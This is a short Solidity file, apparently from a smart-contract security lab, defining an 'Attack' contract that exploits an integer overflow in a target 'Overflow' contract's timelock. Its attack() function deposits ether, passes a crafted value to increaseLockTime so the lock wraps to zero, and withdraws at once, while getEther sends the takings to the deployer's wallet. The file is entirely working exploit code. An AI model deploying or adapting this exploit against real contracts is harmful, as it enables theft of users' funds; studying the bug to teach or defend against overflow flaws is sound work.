//SPDX-License-Identifier:MIT

pragma solidity 0.6.12;

import "./Overflow.sol";

contract Attack{
    Overflow overflow;
    uint public max = 2**256-1;
    address payable private Dev;

    constructor(address _overflowAddress) public{
        overflow = Overflow(_overflowAddress);
        Dev = payable(msg.sender);
    }

    fallback() external payable {}

    function getEther() public{
        Dev.transfer(address(this).balance);    // Takes all the ether from Attack contract to dev wallet.
    }
    
    function attack() public payable{ 
        overflow.deposit{value:msg.value}();
        overflow.increaseLockTime(max-overflow.timeLock(address(this))+1);
        overflow.withdraw();
    }
}